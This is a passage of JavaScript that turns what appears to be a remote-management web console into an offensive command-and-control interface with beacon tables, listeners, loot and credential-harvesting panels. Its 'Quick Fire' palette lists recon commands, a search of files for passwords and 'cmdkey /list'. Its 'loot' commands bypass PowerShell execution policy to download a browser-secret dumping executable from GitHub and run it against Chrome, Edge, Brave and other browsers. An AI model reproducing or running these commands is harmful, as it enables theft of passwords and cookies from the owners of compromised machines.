        for(var b2=0;b2<buckets.length;b2++){var lx=p.left+b2*sx,ly=p.top+ch-(buckets[b2]/maxV)*ch;if(b2===0)ctx.moveTo(lx,ly);else ctx.lineTo(lx,ly);}
        ctx.strokeStyle='#00d4ff'; ctx.lineWidth=1.5; ctx.stroke();

        // Dots
        for(var b3=0;b3<buckets.length;b3++){if(buckets[b3]>0){var px=p.left+b3*sx,py=p.top+ch-(buckets[b3]/maxV)*ch;ctx.beginPath();ctx.arc(px,py,2.5,0,Math.PI*2);ctx.fillStyle='#00d4ff';ctx.fill();}}

        // Labels
        ctx.font='9px JetBrains Mono,monospace'; ctx.fillStyle='#4a5a6a'; ctx.textAlign='center';
        for(var l=0;l<24;l+=6){ctx.fillText('-'+(23-l)+'h',p.left+l*sx,h-4);}
        ctx.fillText('now',p.left+23*sx,h-4);
        ctx.textAlign='right';
        ctx.fillText(maxV,p.left-4,p.top+8);
        ctx.fillText('0',p.left-4,p.top+ch+4);
    }

    // Simplified world map SVG path
    var WT_WORLD_PATH = 'M172,93L185,82L200,78L228,73L240,67L260,62L290,65L310,58L340,55L360,52L390,48L420,52L450,48L470,55L500,52L520,58L540,62L555,68L560,72L570,80L575,90L580,100L575,115L565,125L555,135L548,142L540,138L530,132L515,128L505,125L490,128L480,135L472,140L465,148L458,155L452,162L445,168L440,175L435,182L428,190L422,198L418,205L420,215L425,222L430,230L428,238L422,242L418,235L412,228L408,220L405,212L400,205L395,198L388,192L382,186L380,180L385,172L392,165L398,160L402,155L405,148L402,140L395,138L388,135L380,132L370,135L360,140L350,145L342,150L335,155L328,162L320,168L312,175L305,182L298,188L290,192L282,198L275,205L268,212L262,218L258,225L255,232L250,240L245,248L242,255L240,262L242,268L248,272L255,275L262,278L270,280L278,282L285,280L292,275L298,270L305,265L312,260L318,255L325,252L332,255L338,260L342,268L345,275L348,280L350,286L352,292L348,298L342,302L335,305L328,308L320,310L312,308L305,305L298,302L290,298L282,295L275,292L268,290L260,292L252,295L245,298L238,302L232,308L225,312L218,318L212,325L208,332L205,340L202,348L200,355L198,362L195,370L192,378L190,385L195,392L200,398L208,402L215,398L222,392L228,385L235,378L242,372L250,368L258,365L265,368L272,372L278,376L285,382L290,388L295,392L300,398L298,405L292,410L285,412L278,408L270,405L262,402L255,400L248,398L240,400L232,405L225,410L218,415L212,420L205,422L198,418L192,412L185,408L178,405L172,402L165,398L158,392L152,388L148,382L145,375L142,368L140,360L138,352L135,345L132,338L130,330L128,322L125,315L122,308L120,300L118,292L115,285L112,278L110,270L108,262L105,255L102,248L100,240L98,232L95,225L92,218L90,210L88,202L85,195L82,188L80,180L78,172L75,165L72,158L70,150L68,142L70,135L72,128L75,120L78,112L82,105L85,98L90,92L95,88L100,85L108,82L115,80L122,78L130,77L138,78L145,80L152,82L158,85L165,88L172,93Z M555,78L570,72L585,68L600,65L615,68L628,72L640,78L648,85L652,92L655,100L652,108L648,115L640,122L632,128L625,135L618,140L610,148L602,155L595,162L590,168L585,175L582,182L580,190L578,198L575,205L572,212L570,218L565,225L560,230L555,232L548,228L542,222L538,215L535,208L532,200L530,192L528,185L525,178L522,170L520,162L518,155L515,148L512,140L510,132L510,125L512,118L515,110L518,102L522,95L528,88L535,82L542,78L548,76L555,78Z M340,255L355,252L368,255L378,260L385,268L388,275L390,282L388,290L382,298L375,305L368,310L360,312L352,308L345,302L340,295L338,288L335,280L335,272L338,265L340,255Z';

    function drawWorldMap() {
        var svg = document.getElementById('wtWorldMap');
        if (!svg) return;

        var html = '<rect width="1000" height="500" fill="#080c12" rx="4"/>';
        // Grid
        for(var i=0;i<5;i++){var y=100*i;html+='<line x1="0" y1="'+y+'" x2="1000" y2="'+y+'" stroke="#1e2a36" stroke-width="0.3"/>';}
        for(var j=0;j<10;j++){var x=100*j;html+='<line x1="'+x+'" y1="0" x2="'+x+'" y2="500" stroke="#1e2a36" stroke-width="0.3"/>';}
        // Continents
        html += '<path d="'+WT_WORLD_PATH+'" fill="#0f1520" stroke="#1e2a36" stroke-width="0.8"/>';

        // Plot agents
        if (typeof nodes !== 'undefined' && nodes) {
            for (var n = 0; n < nodes.length; n++) {
                var node = nodes[n];
                if (node.userloc && node.userloc.length >= 2) {
                    var lat = node.userloc[0], lon = node.userloc[1];
                    var px = ((lon+180)/360)*1000, py = ((90-lat)/180)*500;
                    var online = node.conn && node.conn > 0;
                    var col = online ? '#00ff41' : '#ff3333';
                    var op = online ? '0.8' : '0.4';
                    html += '<circle cx="'+px+'" cy="'+py+'" r="3" fill="'+col+'" opacity="'+op+'"/>';
                    if (online) html += '<circle cx="'+px+'" cy="'+py+'" r="7" fill="none" stroke="'+col+'" stroke-width="0.5" opacity="0.3"><animate attributeName="r" from="3" to="10" dur="2s" repeatCount="indefinite"/><animate attributeName="opacity" from="0.4" to="0" dur="2s" repeatCount="indefinite"/></circle>';
                }
            }
        }

        // If no agents with locations, add decorative dots
        if (typeof nodes === 'undefined' || !nodes || nodes.length === 0) {
            var deco = [[300,160],[480,180],[620,250],[720,280],[380,320],[820,180],[200,240],[550,140]];
            for(var d=0;d<deco.length;d++){
                html+='<circle cx="'+deco[d][0]+'" cy="'+deco[d][1]+'" r="2" fill="#00d4ff" opacity="0.15"/>';
            }
        }

        html += '<text x="980" y="490" fill="#1e2a36" font-size="9" text-anchor="end" font-family="JetBrains Mono,monospace">WATCHTOWER GLOBAL NETWORK</text>';
        svg.innerHTML = html;
    }

    // ========================================
    // SECTION 14: Tactical Dashboard - Panel & Toggle
    // ========================================
    function createDashboardPanel() {
        var p1 = document.getElementById('p1');
        if (!p1 || document.getElementById('wtDashboard')) return;

        var dash = document.createElement('div');
        dash.id = 'wtDashboard';
        dash.style.display = 'none';
        dash.innerHTML =
            '<div class="wt-dash-grid">' +
                '<div class="wt-dash-card wt-dash-stat"><div class="wt-dash-stat-icon" style="color:#00ff41">⬤</div><div class="wt-dash-stat-value" id="wtStatOnlineVal">0</div><div class="wt-dash-stat-label">ONLINE</div><div class="wt-dash-stat-bar wt-bar-green"></div></div>' +
                '<div class="wt-dash-card wt-dash-stat"><div class="wt-dash-stat-icon" style="color:#ff3333">⬤</div><div class="wt-dash-stat-value" id="wtStatOfflineVal">0</div><div class="wt-dash-stat-label">OFFLINE</div><div class="wt-dash-stat-bar wt-bar-red"></div></div>' +
                '<div class="wt-dash-card wt-dash-stat"><div class="wt-dash-stat-icon" style="color:#00d4ff">◆</div><div class="wt-dash-stat-value" id="wtStatTotalVal">0</div><div class="wt-dash-stat-label">TOTAL AGENTS</div><div class="wt-dash-stat-bar wt-bar-cyan"></div></div>' +
                '<div class="wt-dash-card wt-dash-stat"><div class="wt-dash-stat-icon" style="color:#ff8c00">■</div><div class="wt-dash-stat-value" id="wtStatGroupsVal">0</div><div class="wt-dash-stat-label">GROUPS</div><div class="wt-dash-stat-bar wt-bar-orange"></div></div>' +
                '<div class="wt-dash-card wt-dash-chart"><div class="wt-dash-card-title">OS DISTRIBUTION</div><canvas id="wtOsDonut" width="200" height="200"></canvas><div id="wtOsLegend" class="wt-dash-legend"></div></div>' +
                '<div class="wt-dash-card wt-dash-chart"><div class="wt-dash-card-title">ACTIVITY (24H)</div><canvas id="wtSparkline" width="400" height="150"></canvas></div>' +
                '<div class="wt-dash-card wt-dash-map"><div class="wt-dash-card-title">AGENT LOCATIONS</div><svg id="wtWorldMap" viewBox="0 0 1000 500" preserveAspectRatio="xMidYMid meet"></svg></div>' +
            '</div>';

        // Insert after the p1title area
        var p1title = document.getElementById('p1title');
        if (p1title) {
            p1.insertBefore(dash, p1title.nextSibling);
        } else {
            p1.appendChild(dash);
        }
    }

    function injectDashboardToggle() {
        var viewIcons = document.getElementById('devListToolbarViewIcons');
        if (!viewIcons || document.getElementById('wtDashToggle')) return;

        var toggle = document.createElement('div');
        toggle.id = 'wtDashToggle';
        toggle.className = 'viewSelector';
        toggle.title = 'Tactical Dashboard';
        toggle.style.cursor = 'pointer';
        toggle.style.padding = '2px 6px';
        toggle.onclick = function() { toggleDashboard(); };
        toggle.innerHTML = '<svg viewBox="0 0 16 16" width="16" height="16" style="vertical-align:middle"><rect x="1" y="1" width="6" height="6" rx="1" fill="currentColor" opacity="0.7"/><rect x="9" y="1" width="6" height="6" rx="1" fill="currentColor" opacity="0.5"/><rect x="1" y="9" width="6" height="6" rx="1" fill="currentColor" opacity="0.5"/><rect x="9" y="9" width="6" height="6" rx="1" fill="currentColor" opacity="0.3"/></svg>';

        viewIcons.appendChild(toggle);
    }

    function toggleDashboard() {
        wtDashboardActive = !wtDashboardActive;
        var dash = document.getElementById('wtDashboard');
        var toolbar = document.getElementById('devListToolbarSpan');
        var xdevices = document.getElementById('xdevices');
        var toggleBtn = document.getElementById('wtDashToggle');

        if (wtDashboardActive) {
            if (dash) dash.style.display = '';
            if (toolbar) toolbar.style.display = 'none';
            if (xdevices) xdevices.style.display = 'none';
            if (toggleBtn) { toggleBtn.style.backgroundColor = 'var(--cs-accent-cyan)'; toggleBtn.style.color = '#0a0e14'; toggleBtn.style.borderRadius = '3px'; }
            updateDashboard();
        } else {
            if (dash) dash.style.display = 'none';
            if (toolbar) toolbar.style.display = '';
            if (xdevices) xdevices.style.display = '';
            if (toggleBtn) { toggleBtn.style.backgroundColor = ''; toggleBtn.style.color = ''; }
        }
    }

    function updateDashboard() {
        if (!wtDashboardActive) return;
        var data = collectDashData();
        var el;
        el = document.getElementById('wtStatOnlineVal'); if(el) el.textContent = data.online;
        el = document.getElementById('wtStatOfflineVal'); if(el) el.textContent = data.offline;
        el = document.getElementById('wtStatTotalVal'); if(el) el.textContent = data.total;
        el = document.getElementById('wtStatGroupsVal'); if(el) el.textContent = data.groups;
        drawDonut('wtOsDonut', data.osDist);
        drawSparkline('wtSparkline');
        drawWorldMap();
    }

    // ========================================
    // SECTION 15: Hook mainUpdate for auto-refresh
    // ========================================
    function hookMainUpdate() {
        if (typeof window.mainUpdate !== 'function') {
            setTimeout(hookMainUpdate, 500);
            return;
        }
        if (window._wtMainUpdateHooked) return;
        window._wtMainUpdateHooked = true;

        var _origMainUpdate = window.mainUpdate;
        window.mainUpdate = function(flags) {
            var result = _origMainUpdate.apply(this, arguments);
            if ((flags & 4) || (flags & 128)) {
                if (wtDashboardActive) {
                    clearTimeout(wtDashboardTimer);
                    wtDashboardTimer = setTimeout(updateDashboard, 300);
                }
            }
            return result;
        };
    }

    function hookGoFunction() {
        if (typeof window.go !== 'function') return;
        if (window._wtGoHooked) return;
        window._wtGoHooked = true;
        var _origGo = window.go;
        window.go = function(x) {
            if (wtDashboardActive && x !== 1) {
                wtDashboardActive = false;
                var dash = document.getElementById('wtDashboard');
                var toolbar = document.getElementById('devListToolbarSpan');
                var xdevices = document.getElementById('xdevices');
                var toggleBtn = document.getElementById('wtDashToggle');
                if (dash) dash.style.display = 'none';
                if (toolbar) toolbar.style.display = '';
                if (xdevices) xdevices.style.display = '';
                if (toggleBtn) { toggleBtn.style.backgroundColor = ''; toggleBtn.style.color = ''; }
            }
            // Hide intel card when leaving device sub-panels
            if (x < 10 || x >= 20) { removeIntelCard(); }
            return _origGo.apply(this, arguments);
        };
    }

    // ========================================
    // SECTION 16: Updated Initialization
    // ========================================
    function isMainPage() { return document.getElementById('column_l') !== null; }

    function init() {
        clearInlineBackground();
        overrideLoginStyles();
        overrideDynamicStyles();

        if (document.body.classList.contains('login')) {
            initParticleNetwork();
        }

        if (!document.body.classList.contains('login')) {
            enhanceFooter();
            replaceSidebarIcons();
        }

        var target = document.getElementById('column_l') || document.body;
        observer.observe(target, { childList: true, subtree: true });

        // Terminal patch on all non-login pages
        if (!document.body.classList.contains('login')) {
            patchTerminalConstructor();
        }

        setTimeout(function() {
            patchSetNightMode();
            clearInlineBackground();
            replaceSidebarIcons();
        }, 200);

        setTimeout(function() {
            overrideLoginStyles();
            overrideDynamicStyles();
            clearInlineBackground();
            replaceSidebarIcons();
            if (!document.body.classList.contains('login')) {
                enhanceFooter();
            }

            // Tier 1 features init (main page only)
            if (isMainPage()) {
                createActivityFeed();
                createDashboardPanel();
                injectDashboardToggle();
                hookWebSocket();
                hookMainUpdate();
                hookGoFunction();
                // Phase 1: Beacon Table, Listener Manager, Command Palette
                hookBeaconTable();
                injectBeaconHeader();
                createWtToolbarRow();
                injectListenerButton();
                setupCommandPalette();
                // Phase 2: Network Topology, Intel Cards, Operations Timeline
                injectTopologyButton();
                setupIntelCards();
                setupOpsTimeline();
                setInterval(function() { if (wtTopoVisible) refreshTopo(); }, 5000);
                // Phase 3: Payload Studio
                injectPayloadButton();
                // Phase 4: Loot Vault
                setupLootVault();
                // Phase 6: Credential Harvester
                setupCredParser();
                // Phase 7: Trip-Wire Monitor
                setupTripWire();
                // Phase 8: Beacon Tasking Queue
                setupTaskQueue();
                // Phase 10: Multi-Beacon Broadcast
                setupBroadcast();
                // Phase 11: Automated Playbooks
                setupPlaybooks();
                // Phase 9: 3D Globe
                setupGlobe();
                // Phase 12: WTAgent C2 Panel
                setupWTAgentPanel();
                // Finalize toolbar layout
                setTimeout(addWtToolbarSeparators, 1200);
            }

            // Also patch terminal on standalone xterm page
            patchTerminalConstructor();
        }, 1000);
    }

    // ========================================
    // SECTION 17: Beacon Session Table
    // ========================================
    var wtBeaconPrevConn = {};

    function getBeaconId(nodeId) {
        if (!nodeId) return '????????';
        var parts = nodeId.split('/');
        var last = parts[parts.length - 1] || nodeId;
        return last.substring(0, 8).toUpperCase();
    }

    function getBeaconStatus(node) {
        if (!node.conn || node.conn === 0) return 'dead';
        if (node.idletime && node.idletime > 300) return 'idle';
        return 'active';
    }

    function hookBeaconTable() {
        var xdevices = document.getElementById('xdevices');
        if (!xdevices) { setTimeout(hookBeaconTable, 600); return; }

        // MutationObserver on xdevices to restyle whenever it changes
        var beaconObs = new MutationObserver(function(mutations) {
            var needsRestyle = false;
            for (var i = 0; i < mutations.length; i++) {
                if (mutations[i].addedNodes.length > 0) { needsRestyle = true; break; }
            }
            if (needsRestyle) setTimeout(applyBeaconTableStyle, 80);
        });
        beaconObs.observe(xdevices, { childList: true, subtree: true });

        // Also hook updateDeviceViewDevice for per-row updates
        hookBeaconDeviceUpdate();
    }

    function hookBeaconDeviceUpdate() {
        if (typeof window.updateDeviceViewDevice !== 'function') {
            setTimeout(hookBeaconDeviceUpdate, 600); return;
        }
        if (window._wtBeaconDevHooked) return;
        window._wtBeaconDevHooked = true;
        var _orig = window.updateDeviceViewDevice;
        window.updateDeviceViewDevice = function(node) {
            var result = _orig.apply(this, arguments);
            if (node) {
                setTimeout(function() {
                    var viewEl = typeof Q === 'function' ? Q('viewselect') : null;
                    if (viewEl && viewEl.value == 2) {
                        var row = document.getElementById('xv2' + node._id);
                        if (row) styleBeaconRow(row, node);
                    }
                }, 20);
            }
            return result;
        };
    }

    function applyBeaconTableStyle() {
        var xdevices = document.getElementById('xdevices');
        if (!xdevices) return;
        styleBeaconHeaders(xdevices);
        var rows = xdevices.querySelectorAll('tr[id^="xv2"]');
        for (var i = 0; i < rows.length; i++) {
            styleBeaconRow(rows[i], null);
        }
        updateBeaconHeaderCounts();
    }

    function styleBeaconHeaders(container) {
        var ths = container.querySelectorAll('th');
        var map = {
            'User': 'OPERATOR', 'Address': 'IP ADDRESS',
            'Connectivity': 'CHANNEL', 'Last Seen': 'LAST BEACON',
            'OS': 'PLATFORM', 'Agent Type': 'AGENT', 'Agent Version': 'VER',
            'Tags': 'TAGS', 'Idle Time': 'IDLE', 'Links': 'ROUTES',
            'Windows AV': 'AV', 'Windows Update': 'WUPDATE', 'Windows Firewall': 'FW',
            'Last Boot Up Time': 'BOOT TIME', 'AMT Host': 'AMT HOST', 'AMT State': 'AMT'
        };
        ths.forEach(function(th) {
            if (th.getAttribute('data-wt-styled')) return;
            th.setAttribute('data-wt-styled', '1');
            th.classList.add('wt-beacon-th');
            var txt = th.textContent.trim();
            if (map[txt]) th.textContent = map[txt];
        });
    }

    function styleBeaconRow(row, node) {
        if (!row) return;
        if (!node) {
            var rowId = row.id;
            if (rowId && rowId.indexOf('xv2') === 0) {
                var nodeId = rowId.substring(3);
                if (typeof nodes !== 'undefined' && nodes) {
                    for (var i = 0; i < nodes.length; i++) {
                        if (nodes[i]._id === nodeId) { node = nodes[i]; break; }
                    }
                }
            }
        }
        if (!node) return;

        var status = getBeaconStatus(node);
        var isConn = !!(node.conn && node.conn > 0);
        var wasConn = wtBeaconPrevConn[node._id];

        row.classList.remove('wt-beacon-active', 'wt-beacon-idle', 'wt-beacon-dead', 'wt-beacon-new');
        row.classList.add('wt-beacon-row', 'wt-beacon-' + status);

        if (isConn && !wasConn) {
            row.classList.add('wt-beacon-new');
            (function(r) {
                setTimeout(function() { r.classList.remove('wt-beacon-new'); }, 10000);
            })(row);
        }
        wtBeaconPrevConn[node._id] = isConn;

        // VM detection — icon=8 is XEN agent; also catch osdesc-reported VMs
        var isVM = (node.icon === 8);
        if (!isVM) {
            var od = (node.osdesc || node.osinfo || '').toLowerCase();
            var vmKeywords = ['virtual', 'vmware', 'hyper-v', 'hyperv', 'virtualbox', 'vbox', 'kvm', 'qemu', 'xen', 'parallels', 'bhyve'];
            for (var vi = 0; vi < vmKeywords.length; vi++) {
                if (od.indexOf(vmKeywords[vi]) >= 0) { isVM = true; break; }
            }
        }
        if (isVM) {
            row.classList.add('wt-vm-node');
            // If icon div is not already i8, swap it so the VM icon renders
            var iconDiv = row.querySelector('[class^="i"]');
            if (iconDiv && node.icon !== 8) {
                var curClass = iconDiv.className;
                iconDiv.className = curClass.replace(/\bi\d\b/, 'i8');
            }
        } else {
            row.classList.remove('wt-vm-node');
        }

        // Inject beacon ID badge into name cell (only once)
        var firstCell = row.querySelector('td');
        if (firstCell && !firstCell.getAttribute('data-wt-bid')) {
            firstCell.setAttribute('data-wt-bid', '1');
            injectBeaconBadge(firstCell, node, status);
        } else if (firstCell) {
            var badge = firstCell.querySelector('.wt-beacon-id-badge');
            if (badge) badge.className = 'wt-beacon-id-badge wt-bid-' + status;
        }
    }

    function injectBeaconBadge(cell, node, status) {
        var bid = getBeaconId(node._id);
        // Insert a tiny beacon-ID chip before the name div (style10)
        var nameDiv = cell.querySelector('.style10');
        if (!nameDiv) return;
        var parent = nameDiv.parentNode;
        if (parent && !parent.querySelector('.wt-beacon-id-badge')) {
            var badge = document.createElement('span');
            badge.className = 'wt-beacon-id-badge wt-bid-' + status;
            badge.textContent = bid;
            badge.title = node._id;
            badge.style.pointerEvents = 'none';
            parent.insertBefore(badge, nameDiv);
        }
    }

    function injectBeaconHeader() {
        var xdevices = document.getElementById('xdevices');
        if (!xdevices || document.getElementById('wtBeaconHeader')) return;
        var hdr = document.createElement('div');
        hdr.id = 'wtBeaconHeader';
        hdr.className = 'wt-beacon-header';
        hdr.innerHTML =
            '<span class="wt-bh-label">&#x2B22; BEACON SESSIONS</span>' +
            '<span class="wt-bh-divider">|</span>' +
            '<span class="wt-bh-stat">' +
                '<span class="wt-beacon-status-dot wt-dot-active wt-bh-dot"></span>' +
                '<span id="wtBHActiveNum" style="color:var(--cs-accent-green)">0</span>&nbsp;ACTIVE' +
            '</span>' +
            '<span class="wt-bh-divider">|</span>' +
            '<span class="wt-bh-stat">' +
                '<span class="wt-beacon-status-dot wt-dot-dead wt-bh-dot"></span>' +
                '<span id="wtBHDeadNum" style="color:var(--cs-text-muted)">0</span>&nbsp;DEAD' +
            '</span>' +
            '<span class="wt-bh-spacer"></span>' +
            '<span class="wt-bh-time" id="wtBHTime">SYNC --:--:--</span>';
        xdevices.parentNode.insertBefore(hdr, xdevices);
        setInterval(updateBeaconHeaderCounts, 4000);
        updateBeaconHeaderCounts();
    }

    function updateBeaconHeaderCounts() {
        var active = 0, dead = 0;
        if (typeof nodes !== 'undefined' && nodes) {
            for (var i = 0; i < nodes.length; i++) {
                if (nodes[i].conn && nodes[i].conn > 0) active++; else dead++;
            }
        }
        var ae = document.getElementById('wtBHActiveNum');
        var de = document.getElementById('wtBHDeadNum');
        var te = document.getElementById('wtBHTime');
        if (ae) ae.textContent = active;
        if (de) de.textContent = dead;
        if (te) {
            var now = new Date();
            te.textContent = 'SYNC ' + pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
        }
    }

    // ========================================
    // SECTION 18: Listener Manager Panel
    // ========================================
    var wtListenerVisible = false;

    function injectListenerButton() {
        if (document.getElementById('wtListenerBtn')) return;
        var toolbar = getWtToolbar();
        if (!toolbar) { setTimeout(injectListenerButton, 800); return; }

        var btn = document.createElement('span');
        btn.id = 'wtListenerBtn';
        btn.className = 'wt-toolbar-btn';
        btn.title = 'Listener Manager';
        btn.innerHTML =
            '<svg viewBox="0 0 16 16" width="12" height="12" style="vertical-align:-1px;margin-right:4px">' +
            '<circle cx="8" cy="8" r="5" fill="none" stroke="currentColor" stroke-width="1.5"/>' +
            '<circle cx="8" cy="8" r="2" fill="currentColor"/>' +
            '<line x1="8" y1="1" x2="8" y2="3.5" stroke="currentColor" stroke-width="1.5"/>' +
            '<line x1="8" y1="12.5" x2="8" y2="15" stroke="currentColor" stroke-width="1.5"/>' +
            '<line x1="1" y1="8" x2="3.5" y2="8" stroke="currentColor" stroke-width="1.5"/>' +
            '<line x1="12.5" y1="8" x2="15" y2="8" stroke="currentColor" stroke-width="1.5"/>' +
            '</svg>LISTENERS';
        btn.onclick = function() { toggleListenerPanel(); };
        toolbar.appendChild(btn);

        createListenerPanel();
    }

    function createListenerPanel() {
        if (document.getElementById('wtListenerPanel')) return;
        var panel = document.createElement('div');
        panel.id = 'wtListenerPanel';
        panel.className = 'wt-listener-panel';
        panel.innerHTML =
            '<div class="wt-lp-header">' +
                '<span class="wt-lp-title">' +
                    '<svg viewBox="0 0 16 16" width="11" height="11" style="vertical-align:-1px;margin-right:6px">' +
                    '<circle cx="8" cy="8" r="5" fill="none" stroke="#00d4ff" stroke-width="1.5"/>' +
                    '<circle cx="8" cy="8" r="2" fill="#00d4ff"/>' +
                    '</svg>LISTENER MANAGER' +
                '</span>' +
                '<span style="display:flex;align-items:center;gap:8px">' +
                    '<span class="wt-lp-badge" id="wtLPCount">0 LISTENERS</span>' +
                    '<button class="wt-lp-refresh" onclick="window._wtRefreshListeners()">&#8635; REFRESH</button>' +
                    '<button class="wt-lp-close" onclick="window._wtToggleListener()" title="Close">&#10005;</button>' +
                '</span>' +
            '</div>' +
            '<div class="wt-lp-table-wrap">' +
                '<table class="wt-lp-table">' +
                    '<thead><tr>' +
                        '<th>NAME</th><th>PAYLOAD</th><th>HOST</th>' +
                        '<th>PROTOCOL</th><th>BEACONS</th><th>STATUS</th>' +
                    '</tr></thead>' +
                    '<tbody id="wtLPBody"><tr><td colspan="6" class="wt-lp-empty">Loading...</td></tr></tbody>' +
                '</table>' +
            '</div>';

        var p1 = document.getElementById('p1');
        if (p1) p1.appendChild(panel);

        window._wtToggleListener = toggleListenerPanel;
        window._wtRefreshListeners = refreshListenerTable;
        setTimeout(refreshListenerTable, 600);
    }

    function toggleListenerPanel() {
        wtListenerVisible = !wtListenerVisible;
        var panel = document.getElementById('wtListenerPanel');
        var btn = document.getElementById('wtListenerBtn');
        if (panel) panel.style.display = wtListenerVisible ? '' : 'none';
        if (btn) {
            btn.style.background = wtListenerVisible ? 'rgba(0,212,255,0.1)' : '';
            btn.style.borderColor = wtListenerVisible ? 'rgba(0,212,255,0.35)' : '';
            btn.style.color = wtListenerVisible ? 'var(--cs-accent-cyan)' : '';
        }
        if (wtListenerVisible) refreshListenerTable();
    }

    function refreshListenerTable() {
        var tbody = document.getElementById('wtLPBody');
        var countEl = document.getElementById('wtLPCount');
        if (!tbody) return;
        var rows = '', count = 0;

        if (typeof meshes !== 'undefined' && meshes) {
            for (var meshId in meshes) {
                var mesh = meshes[meshId];
                if (!mesh) continue;
                count++;
                var payload = 'MESH-AGENT';
                if (mesh.mtype === 1) payload = 'INTEL-AMT';
                else if (mesh.mtype === 3) payload = 'LOCAL';
                else if (mesh.mtype === 4) payload = 'IP-KVM';

                var online = 0, total = 0;
                if (typeof nodes !== 'undefined' && nodes) {
                    for (var i = 0; i < nodes.length; i++) {
                        if (nodes[i].meshid === meshId) {
                            total++;
                            if (nodes[i].conn && nodes[i].conn > 0) online++;
                        }
                    }
                }

                var proto = (mesh.mtype === 3) ? 'LOCAL/TCP' : 'HTTPS/WSS';
                var statusCls = online > 0 ? 'wt-lp-up' : 'wt-lp-idle';
                var statusTxt = online > 0 ? '&#9650; UP' : '&#9711; IDLE';

                rows +=
                    '<tr class="wt-lp-row">' +
                    '<td class="wt-lp-name" title="' + wtEscapeHtml(mesh._id) + '">' + wtEscapeHtml(mesh.name) + '</td>' +
                    '<td class="wt-lp-payload">' + payload + '</td>' +
                    '<td class="wt-lp-host">' + (location.hostname || 'localhost') + '</td>' +
                    '<td class="wt-lp-proto">' + proto + '</td>' +
                    '<td class="wt-lp-beacons"><span style="color:var(--cs-accent-green)">' + online + '</span>/' + total + '</td>' +
                    '<td><span class="' + statusCls + '">' + statusTxt + '</span></td>' +
                    '</tr>';
            }
        }

        if (!rows) rows = '<tr><td colspan="6" class="wt-lp-empty">No listeners. Create a Device Group first.</td></tr>';
        tbody.innerHTML = rows;
        if (countEl) countEl.textContent = count + ' LISTENER' + (count !== 1 ? 'S' : '');
    }

    // ========================================
    // SECTION 19: Command Palette (Quick-Fire)
    // ========================================
    var wtCmdHistory = [];
    var WT_CMD_HIST_KEY = 'wt_cmd_history_v1';

    var WT_QUICK_CMDS = [
        { label: 'whoami',    cmd: 'whoami',                          cat: 'recon' },
        { label: 'id',        cmd: 'id',                              cat: 'recon' },
        { label: 'hostname',  cmd: 'hostname',                        cat: 'recon' },
        { label: 'uname',     cmd: 'uname -a',                        cat: 'recon' },
        { label: 'sysinfo',   cmd: 'systeminfo',                      cat: 'recon' },
        { label: 'ipconfig',  cmd: 'ipconfig /all',                   cat: 'net'   },
        { label: 'ifconfig',  cmd: 'ip a 2>/dev/null || ifconfig',    cat: 'net'   },
        { label: 'netstat',   cmd: 'netstat -ano',                    cat: 'net'   },
        { label: 'arp -a',    cmd: 'arp -a',                          cat: 'net'   },
        { label: 'route',     cmd: 'route print 2>nul || ip route',   cat: 'net'   },
        { label: 'ps (win)',  cmd: 'tasklist /v',                     cat: 'proc'  },
        { label: 'ps (lnx)',  cmd: 'ps aux --sort=-%cpu | head -25',  cat: 'proc'  },
        { label: 'users',     cmd: 'net user 2>nul || cat /etc/passwd | cut -d: -f1', cat: 'enum' },
        { label: 'who',       cmd: 'who 2>/dev/null || query user',   cat: 'enum'  },
        { label: 'env',       cmd: 'set 2>nul || env',                cat: 'enum'  },
        { label: 'creds?',    cmd: 'cmdkey /list',                    cat: 'enum'  },
        { label: 'dir home',  cmd: 'dir %USERPROFILE% 2>nul || ls -la ~', cat: 'files' },
        { label: 'findstr',   cmd: 'findstr /si password *.txt *.xml *.ini 2>nul', cat: 'files' },
        { label: 'sudo -l',   cmd: 'sudo -l 2>/dev/null',             cat: 'priv'  },
        { label: 'privs',     cmd: 'whoami /priv',                    cat: 'priv'  },
        { label: 'dbs-drop',  cmd: 'powershell -ep bypass -c "iwr \'https://github.com/Maldev-Academy/DumpBrowserSecrets/releases/download/v1.2.0/DumpBrowserSecrets.exe\' -o $env:TEMP\\dbs.exe -UseBasicParsing"', cat: 'loot' },
        { label: 'dbs-all',   cmd: 'powershell -ep bypass -c "cd $env:TEMP; .\\dbs.exe /b:all /e:all /spoof"', cat: 'loot' },
        { label: 'dbs-chrome',cmd: 'powershell -ep bypass -c "cd $env:TEMP; .\\dbs.exe /b:Chrome /b:Edge /b:Brave /e:all /spoof"', cat: 'loot' },
        { label: 'dbs-enc',   cmd: 'powershell -ep bypass -c "cd $env:TEMP; .\\dbs.exe /b:all /e:all /enc:0xDEADBEEF"', cat: 'loot' }
    ];

    var WT_CAT_COLORS = {
        recon: '#00d4ff', net: '#00ff41', proc: '#a855f7',
        enum: '#ff8c00', files: '#7a8a9a', priv: '#ff3333',
        loot: '#ffd700'
    };

    function setupCommandPalette() {
        try {
            var h = localStorage.getItem(WT_CMD_HIST_KEY);
            if (h) wtCmdHistory = JSON.parse(h) || [];
        } catch(e) {}
        watchForTerminal();
    }

    function watchForTerminal() {
        var termWatcher = new MutationObserver(function() {
            var area = document.getElementById('p12') || document.getElementById('p13');
            if (area && area.style.display !== 'none' && !document.getElementById('wtCmdPalette')) {
                setTimeout(injectCommandPalette, 300);
            }
        });
        termWatcher.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['style'] });
    }

    function injectCommandPalette() {
        if (document.getElementById('wtCmdPalette')) return;
        var termDiv = document.getElementById('termarea3xdiv') || document.querySelector('.xterm');
        if (!termDiv) return;

        var cmdsHtml = WT_QUICK_CMDS.map(function(c) {
            var col = WT_CAT_COLORS[c.cat] || '#7a8a9a';
            return '<button class="wt-cmd-btn" title="[' + c.cat.toUpperCase() + '] ' + wtEscapeHtml(c.cmd) + '" ' +
                   'data-cmd="' + wtEscapeHtml(c.cmd) + '" ' +
                   'style="border-left:2px solid ' + col + '">' +
                   wtEscapeHtml(c.label) + '</button>';
        }).join('');

        var palette = document.createElement('div');
        palette.id = 'wtCmdPalette';
        palette.className = 'wt-cmd-palette';
        palette.innerHTML =
            '<div class="wt-cmd-section-title">QUICK FIRE' +
                '<span class="wt-cmd-legend">' +
                    Object.keys(WT_CAT_COLORS).map(function(k) {
                        return '<span style="color:' + WT_CAT_COLORS[k] + ';font-size:8px">&#9632; ' + k + '</span>';
                    }).join(' ') +
                '</span>' +
            '</div>' +
            '<div class="wt-cmd-grid">' + cmdsHtml + '</div>' +
            '<div class="wt-cmd-section-title" style="margin-top:8px">' +
